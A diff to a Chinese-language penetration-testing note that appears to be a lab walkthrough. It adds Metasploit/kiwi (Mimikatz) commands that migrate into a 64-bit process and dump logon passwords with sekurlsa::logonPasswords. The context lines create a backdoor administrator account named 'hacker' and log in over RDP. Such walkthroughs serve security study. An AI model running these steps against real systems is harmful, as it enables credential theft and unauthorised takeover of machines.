@@ -134,7 +134,17 @@ net localgroup administrators hacker /add
 rdesktop -u hacker -p 123qwe..  192.168.1.145
 ```
 
+```Css
+使用kiwi来获取靶机密码，注意这里需要进行的一个操作为进程迁移，因为我们这里上线到msf的载荷是32位的(即x86)，这里需要找一个64位的(即x64)进行进程迁移才能使用kiwi获取靶机密码
 
+sessions -i 2
+load kiwi
+kiwi_cmd privilege::debug
+ps
+migrate 1144
+kiwi_cmd sekurlsa::logonPasswords
+
+```
 
 参考链接
 [使用hashcat爆破各种hash | 若水斋](https://blog.werner.wiki/use-hashcat-crack-all-kinds-of-hash/)
